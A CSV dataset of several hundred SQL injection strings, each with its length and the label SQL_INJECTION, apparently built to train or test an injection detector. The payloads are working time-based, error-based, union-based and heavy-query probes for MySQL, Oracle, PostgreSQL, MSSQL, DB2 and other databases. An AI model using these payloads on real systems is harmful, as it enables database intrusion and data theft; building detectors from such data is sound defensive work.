payload,length,label
"1%""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",215,SQL_INJECTION
1'+(select 'mquh' where 3933=3933;select case when 1613=2937 then 1 else null end--,83,SQL_INJECTION
"1"") as qayu where 6222=6222 union all select null,null,null#",60,SQL_INJECTION
"1'+(select sfmz where 4870=4870 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",169,SQL_INJECTION
"1)) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((9542=9542",127,SQL_INJECTION
"1"") union all select null,null,null,null,null,null,null,null#",61,SQL_INJECTION
"1%"")) and (select * from (select(sleep(5)))fzno) and ((""%""=""",60,SQL_INJECTION
"1%'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('%'='",125,SQL_INJECTION
-3359' order by 1--,19,SQL_INJECTION
"1) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",103,SQL_INJECTION
"1'+(select 'ngdk' where 7264=7264 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",97,SQL_INJECTION
"1%""));begin dbms_lock.sleep(5); end--",37,SQL_INJECTION
"1' in boolean mode) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,SQL_INJECTION
"1') and 8407=(select count(*) from generate_series(1,5000000)) and ('pgyl'='pgyl",80,SQL_INJECTION
"1)) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",101,SQL_INJECTION
"-2001'+(select 'nput' where 8368=8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",100,SQL_INJECTION
1)) as trin where 8843=8843;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,111,SQL_INJECTION
1') as llug where 2244=2244 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,210,SQL_INJECTION
"-9272%""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""%""=""",221,SQL_INJECTION
"1%')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('%'='",113,SQL_INJECTION
-9501') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('mndw'='mndw,256,SQL_INJECTION
"-3492"" where 4094=4094 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",210,SQL_INJECTION
-3026) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),204,SQL_INJECTION
"1%""))) or elt(5873=5873,sleep(5))#",34,SQL_INJECTION
"-5300' union all select 2750,2750,2750,2750,2750,2750--",55,SQL_INJECTION
"-3729')) or elt(4482=2648,2648) and (('vkkr' like 'vkkr",55,SQL_INJECTION
"1%"")) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",213,SQL_INJECTION
"-6778) as xutm where 6442=6442 union all select 6442,6442,6442,6442,6442,6442#",78,SQL_INJECTION
"1%"") union all select null--",28,SQL_INJECTION
"1 and 3824=benchmark(5000000,md5(0x76555642))-- kvkk",52,SQL_INJECTION
"1%'));select benchmark(5000000,md5(0x714e4153))#",48,SQL_INJECTION
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('cogf' like 'cogf",86,SQL_INJECTION
"1"") where 1410=1410;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",104,SQL_INJECTION
"1%"");begin user_lock.sleep(5); end and (""%""=""",45,SQL_INJECTION
"1"")) as ihfw where 3949=3949 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",104,SQL_INJECTION
"1"") as ghpx where 2873=2873 waitfor delay '0:0:5'--",51,SQL_INJECTION
"1"")) as dooi where 1806=1806 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",136,SQL_INJECTION
"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",71,SQL_INJECTION
"1'+(select sged where 1181=1181 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",139,SQL_INJECTION
"-7661"" union all select 9551,9551,9551#",39,SQL_INJECTION
"1'||(select 'vpuh' where 8164=8164;select like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",97,SQL_INJECTION
"1"")) as jucs where 6836=6836;select (case when (3414=8741) then 3414 else 3414*(select 3414 from information_schema.character_sets) end)#",137,SQL_INJECTION
"(convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (9339=9339) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))",188,SQL_INJECTION
1' and (select * from (select(sleep(5)))gcrr)#,46,SQL_INJECTION
"1"") where 7840=7840 union all select null,null#",47,SQL_INJECTION
"1'))) and elt(1210=1210,sleep(5)) and ((('aiuy'='aiuy",53,SQL_INJECTION
"1'||(select 'npel' from dual where 5258=5258;select benchmark(5000000,md5(0x4c4d6142)))||'",90,SQL_INJECTION
"-8982' in boolean mode) union all select 5367,5367,5367,5367,5367,5367#",71,SQL_INJECTION
"-8308"") union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",70,SQL_INJECTION
"1'||(select 'kojx' from dual where 8140=8140 and 2388=benchmark(5000000,md5(0x6d457153))#",89,SQL_INJECTION
1')) as oyad where 7161=7161 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,124,SQL_INJECTION
"1"") and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""gozk""=""gozk",224,SQL_INJECTION
"1%"" and 6408=7959--",19,SQL_INJECTION
"-3719"" union all select 6609,6609,6609,6609#",44,SQL_INJECTION
"1' where 6953=6953 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",125,SQL_INJECTION
"1"" waitfor delay '0:0:5'--",26,SQL_INJECTION
1' where 5103=5103;select case when 7717=7717 then 1 else null end--,68,SQL_INJECTION
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'fbzo' like 'fbzo,256,SQL_INJECTION
1%' rlike (select * from (select(sleep(5)))vwyq)#,49,SQL_INJECTION
"1;select count(*) from generate_series(1,5000000)--",51,SQL_INJECTION
"1"")));select count(*) from generate_series(1,5000000) and (((""wdbg"" like ""wdbg",78,SQL_INJECTION
"1%"");iif(7036=2370,1,1/0)",25,SQL_INJECTION
"1)) as fmpr where 3103=3103 and elt(9970=9297,9297)--",53,SQL_INJECTION
"1')) or 8421=(select count(*) from generate_series(1,5000000)) and (('uorw' like 'uorw",86,SQL_INJECTION
"-8612') as toeu where 6357=6357 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",228,SQL_INJECTION
"-2912"") as eizh where 2223=2223 or make_set(1041=3056,3056)--",61,SQL_INJECTION
"1 or elt(6272=6272,sleep(5))-- ilfc",35,SQL_INJECTION
"1"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""uglh"" like ""uglh",129,SQL_INJECTION
"1"")) as zbfj where 2285=2285;(select * from (select(sleep(5)))acdk)#",68,SQL_INJECTION
"1"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",110,SQL_INJECTION
-4900')) or 7208=3236,21,SQL_INJECTION
"1')) union all select null,null,null,null,null,null,null,null--",63,SQL_INJECTION
1'+(select wgmn where 4368=4368 and 7859=6151)+',48,SQL_INJECTION
1%';select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,87,SQL_INJECTION
"1')));select count(*) from generate_series(1,5000000) and ((('xori' like 'xori",78,SQL_INJECTION
"1)) and make_set(8554=3286,3286) and ((7385=7385",48,SQL_INJECTION
"1))) and make_set(8403=8403,8899) and (((3036=3036",50,SQL_INJECTION
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'yfkk'='yfkk",115,SQL_INJECTION
"-1641'||(select 'jfnu' where 7682=7682 union all select 7682,7682,7682--",72,SQL_INJECTION
"1') and make_set(8403=8403,8899) and ('dhoo' like 'dhoo",55,SQL_INJECTION
"1"" where 8918=8918 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",218,SQL_INJECTION
1 and (1977=6852)*6852-- clxl,29,SQL_INJECTION
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('yqrt' like 'yqrt",125,SQL_INJECTION
-2483' where 1327=1327 union all select 1327#,45,SQL_INJECTION
"-9934"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""xecb"" like ""xecb",225,SQL_INJECTION
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",153,SQL_INJECTION
"1') as jxqt where 4322=4322 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",165,SQL_INJECTION
1'))) and 7533=7533 and ((('hoyw'='hoyw,39,SQL_INJECTION
"1"")) as mvxa where 3024=3024;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",112,SQL_INJECTION
"1"" and 4288=3696 and ""qqam"" like ""qqam",38,SQL_INJECTION
-2233' or (1807=7274)*7274,26,SQL_INJECTION
1') where 1917=1917 union all select null#,42,SQL_INJECTION
-1385'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('mjjd'='mjjd,122,SQL_INJECTION
"1)) and 2388=benchmark(5000000,md5(0x6d457153))#",48,SQL_INJECTION
"1'||(select 'ejuu' from dual where 2903=2903 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",149,SQL_INJECTION
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('lvck'='lvck",217,SQL_INJECTION
"1,(select 9100=('qqpjq'||(select case 9100 when 9100 then 1 else 0 end from rdb$database)||'qzvzq'))",100,SQL_INJECTION
"1')) as yyrx where 5600=5600;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",120,SQL_INJECTION
1))) and (6148=3343)*3343 and (((3271=3271,42,SQL_INJECTION
"1"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""qqky"" like ""qqky",103,SQL_INJECTION
"1')) as fwxq where 9935=9935 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",132,SQL_INJECTION
"-6523"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""bwrb"" like ""bwrb",259,SQL_INJECTION
1' in boolean mode);begin dbms_lock.sleep(5); end--,51,SQL_INJECTION
-3861') as zmja where 4036=4036 or 9323=9323#,45,SQL_INJECTION
1'+(select 'zjvx' where 4683=4683 and 6969=(select 6969 from pg_sleep(5)))+',76,SQL_INJECTION
"1%') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('%'='",107,SQL_INJECTION
1' and (select * from (select(sleep(5)))fzno),45,SQL_INJECTION
"1"";begin user_lock.sleep(5); end and ""mdje"" like ""mdje",54,SQL_INJECTION
"-6333""))) union all select 9851,9851,9851,9851,9851,9851--",58,SQL_INJECTION
"1"" where 4345=4345 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",219,SQL_INJECTION
"-9725') union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",76,SQL_INJECTION
-7707')) union all select 3172#,31,SQL_INJECTION
1 or (select * from (select(sleep(5)))sddo)#,44,SQL_INJECTION
1%') rlike (select (case when (1210=8664) then 1 else 0x28 end)) and ('%'=',75,SQL_INJECTION
"1,(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",168,SQL_INJECTION
"-7248') where 4626=4626 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",154,SQL_INJECTION
1' where 9816=9816 and 7533=7533--,34,SQL_INJECTION
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('gsdq'='gsdq",120,SQL_INJECTION
-1802' or 7931=5841--,21,SQL_INJECTION
"1"" or 6793=(select 6793 from pg_sleep(5))",41,SQL_INJECTION
1 rlike (select (case when (7689=7689) then 1 else 0x28 end))-- jduw,68,SQL_INJECTION
"-2725"" union all select 3671,3671,3671,3671,3671#",49,SQL_INJECTION
"1)) union all select null,null,null,null,null,null,null,null,null,null--",72,SQL_INJECTION
"-7202%"")) union all select 2901#",32,SQL_INJECTION
1'));select pg_sleep(5) and (('rnzp'='rnzp,42,SQL_INJECTION
"1%"";select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",112,SQL_INJECTION
"1%'));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",66,SQL_INJECTION
"1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('cylu'='cylu",129,SQL_INJECTION
"1'))) and make_set(9514=8668,8668) and ((('sgjj' like 'sgjj",59,SQL_INJECTION
"1')) as pstn where 6691=6691 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",226,SQL_INJECTION
"-3628"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",201,SQL_INJECTION
-6802) as coyv where 5693=5693 or 8571=8571--,45,SQL_INJECTION
"1"") where 9295=9295 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",224,SQL_INJECTION
"1))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((4234=4234",172,SQL_INJECTION
1)));(select * from (select(sleep(5)))acdk)#,44,SQL_INJECTION
"1' where 3339=3339 and 3824=benchmark(5000000,md5(0x76555642))--",64,SQL_INJECTION
"1%'))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",101,SQL_INJECTION
1')));select (case when (9562=5996) then 1 else 9562*(select 9562 from master..sysdatabases) end)--,99,SQL_INJECTION
"-9860) where 8743=8743 union all select 8743,8743,8743,8743,8743,8743,8743--",76,SQL_INJECTION
-7442) or 3391=7492,19,SQL_INJECTION
"1%"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""%""=""",106,SQL_INJECTION
"1' in boolean mode);iif(1378=6569,1,1/0)",40,SQL_INJECTION
"-3364%""))) union all select 5464--",34,SQL_INJECTION
"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",59,SQL_INJECTION
"1) where 9338=9338 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",109,SQL_INJECTION
"1""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""tepf""=""tepf",196,SQL_INJECTION
1);select (case when (9455=6007) then 9455 else 9455*(select 9455 from mysql.db) end)#,86,SQL_INJECTION
"-1869""))) union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",73,SQL_INJECTION
"1)));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((5324=5324",104,SQL_INJECTION
"1%""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",113,SQL_INJECTION
"1))) union all select null,null,null,null,null,null#",52,SQL_INJECTION
"1""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""xnsj"" like ""xnsj",124,SQL_INJECTION
1 and 2620=2175,15,SQL_INJECTION
-6755) or 9323=9323#,20,SQL_INJECTION
"1%"" order by 1#",15,SQL_INJECTION
"1) as wokl where 1368=1368 union all select null,null,null,null,null,null--",75,SQL_INJECTION
-9739' or 8571=8571--,21,SQL_INJECTION
"1"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""tzog"" like ""tzog",127,SQL_INJECTION
"1"";select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",100,SQL_INJECTION
1'||(select 'yucg' where 2576=2576 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))||',270,SQL_INJECTION
"1,(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--",210,SQL_INJECTION
"1%'))) union all select null,null,null,null,null,null,null,null--",65,SQL_INJECTION
"1%' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and '%'='",88,SQL_INJECTION
1' in boolean mode);(select * from (select(sleep(5)))srmq)#,59,SQL_INJECTION
"1 and 8407=(select count(*) from generate_series(1,5000000))# tqmr",66,SQL_INJECTION
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""oyfk""=""oyfk",123,SQL_INJECTION
"1"" where 9172=9172 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",221,SQL_INJECTION
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))-- zvkh",68,SQL_INJECTION
"1' and elt(1210=1210,sleep(5))",30,SQL_INJECTION
1')) and (1427=5813)*5813 and (('estb' like 'estb,49,SQL_INJECTION
"-4515"") or elt(4545=2509,2509) and (""lglx""=""lglx",48,SQL_INJECTION
-7037')) as epsg where 3684=3684 union all select 3684--,56,SQL_INJECTION
"1') or 8421=(select count(*) from generate_series(1,5000000)) and ('csmu'='csmu",79,SQL_INJECTION
1 where 7516=7516 union all select null#,40,SQL_INJECTION
-6190'))) union all select 9413--,33,SQL_INJECTION
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('hfxu' like 'hfxu",123,SQL_INJECTION
-4607'||(select 'wkdg' where 7524=7524 order by 1--,51,SQL_INJECTION
"1"" where 5372=5372 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",114,SQL_INJECTION
"-4838')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",139,SQL_INJECTION
-5995')) or 6872=6872 and (('pywh'='pywh,40,SQL_INJECTION
"1)) as ipfy where 1189=1189;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",124,SQL_INJECTION
"1%"")) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""%""=""",113,SQL_INJECTION
"1"" where 4298=4298 order by 1--",31,SQL_INJECTION
"1) where 7729=7729;iif(5257=5257,1,1/0)",39,SQL_INJECTION
"1"" and elt(8464=5761,5761) and ""ydmt"" like ""ydmt",48,SQL_INJECTION
1') or 6793=(select 6793 from pg_sleep(5)) and ('dtzt' like 'dtzt,65,SQL_INJECTION
"-9966')) union all select 7230,7230,7230,7230,7230,7230,7230#",61,SQL_INJECTION
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('yqzg'='yqzg",122,SQL_INJECTION
"1"" and 7533=7533",16,SQL_INJECTION
"1'+(select 'vabj' where 7178=7178 union all select null,null,null,null,null#",76,SQL_INJECTION
-4351') or 6525=9458,20,SQL_INJECTION
"1"") as gjlv where 1983=1983 and sleep(5)#",41,SQL_INJECTION
1));select (case when (8113=8981) then 8113 else 1/(select 0) end)--,68,SQL_INJECTION
"1'+(select ouhd where 8905=8905 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",185,SQL_INJECTION
"1"" where 9725=9725;waitfor delay '0:0:5'--",42,SQL_INJECTION
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))-- uslt",97,SQL_INJECTION
"1"" union all select null,null,null--",36,SQL_INJECTION
"1'||(select 'ymac' from dual where 9268=9268 or 8466=benchmark(5000000,md5(0x694a4745)))||'",91,SQL_INJECTION
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('ekla'='ekla",120,SQL_INJECTION
"1"" where 2365=2365 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,SQL_INJECTION
"1'+(select 'rajp' where 3300=3300;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",118,SQL_INJECTION
"1')) as lrnh where 8569=8569 union all select null,null,null,null,null--",72,SQL_INJECTION
1)) as goar where 2405=2405 and 5927=9731--,43,SQL_INJECTION
"-7793""))) or (8459=8459)*4906 and (((""lias""=""lias",49,SQL_INJECTION
1') or sleep(5),15,SQL_INJECTION
1)) and 7533=7533 and ((8738=8738,33,SQL_INJECTION
"-1084') union all select 2634,2634,2634,2634,2634,2634,2634,2634#",65,SQL_INJECTION
"1%""))) and 8594=(select 8594 from pg_sleep(5))--",48,SQL_INJECTION
-3105' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'srep'='srep,209,SQL_INJECTION
"1'+(select mumb where 4658=4658 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",140,SQL_INJECTION
-5137) or 9323=9323#,20,SQL_INJECTION
"1') where 9272=9272;select benchmark(5000000,md5(0x4c4d6142))--",63,SQL_INJECTION
1' in boolean mode);select pg_sleep(5)#,39,SQL_INJECTION
-5852) as anca where 3574=3574 or 3958=5536#,44,SQL_INJECTION
1%')) or (select * from (select(sleep(5)))ydpu) and (('%'=',59,SQL_INJECTION
1))) union all select null--,28,SQL_INJECTION
"1"") as hymr where 5497=5497 union all select null,null,null,null--",66,SQL_INJECTION
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""fvtu"" like ""fvtu",164,SQL_INJECTION
"1') or 8421=(select count(*) from generate_series(1,5000000))",61,SQL_INJECTION
"1%""))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",50,SQL_INJECTION
"1) where 6035=6035;select benchmark(5000000,md5(0x714e4153))#",61,SQL_INJECTION
"1"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",93,SQL_INJECTION
"1)) or 8466=benchmark(5000000,md5(0x694a4745)) and ((8189=8189",62,SQL_INJECTION
"1'||(select 'qdkb' where 4331=4331;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",153,SQL_INJECTION
"1"")) as jikg where 8258=8258 and (3973=1047)*1047--",51,SQL_INJECTION
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('bdsq' like 'bdsq",136,SQL_INJECTION
"1')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,SQL_INJECTION
"1 or 8466=benchmark(5000000,md5(0x694a4745))",44,SQL_INJECTION
"1'+(select thmg where 2546=2546 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",129,SQL_INJECTION
"-3666""))) union all select 4136,4136,4136--",43,SQL_INJECTION
1 and 8594=(select 8594 from pg_sleep(5))--,43,SQL_INJECTION
"1'))) union all select null,null,null,null,null,null#",53,SQL_INJECTION
"1"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""azpb""=""azpb",126,SQL_INJECTION
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",101,SQL_INJECTION
"1"") as qnmd where 5642=5642;select (case when (9318=7198) then 9318 else 9318*(select 9318 from information_schema.character_sets) end)#",136,SQL_INJECTION
1' where 8770=8770 union all select null--,42,SQL_INJECTION
"1') and elt(3528=3566,3566)",27,SQL_INJECTION
1') or (select * from (select(sleep(5)))sddo)#,46,SQL_INJECTION
1')));if(7899=7899) select 7899 else drop function zbbp--,57,SQL_INJECTION
